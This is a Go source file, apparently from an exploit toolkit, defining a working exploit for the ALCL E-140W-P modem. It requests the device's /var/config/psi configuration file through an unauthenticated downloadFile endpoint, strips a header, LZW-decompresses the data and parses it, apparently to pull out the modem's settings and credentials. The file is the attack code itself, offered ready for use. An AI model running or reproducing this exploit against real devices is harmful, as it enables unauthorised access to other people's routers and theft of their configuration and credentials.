package exp

import (
	"bytes"
	"errors"
	"fmt"
	"golang.org/x/image/tiff/lzw"
	"io/ioutil"
	"net/http"
)

func ALCL_E_140W_P() *Exp {
	return &Exp{
		Name: "ALCL E-140W-P downloadFile?file=/var/config/psi",
		Handle: func(host string) (*Result, error) {
			response, err := http.Get(fmt.Sprintf("http://%s/downloadFile?file=/var/config/psi", host))
			if err != nil {
				return nil, err
			}
			if response.StatusCode != 200 {
				return nil, errors.New("error send http request")
			}

			encryptData, err := ioutil.ReadAll(response.Body)
			if err != nil {
				return nil, err
			}

			// ignore leading 0x3C bytes
			encryptData = encryptData[0x3C:]

			// lzw decompress
			reader := lzw.NewReader(bytes.NewReader(encryptData), lzw.MSB, 8)
			data, err := ioutil.ReadAll(reader)
			if err != nil {
				return nil, err
			}

			result, err := parseModemConfig(data)
			if err != nil {
				return nil, err
			}

			return result, nil
		},
	}
}
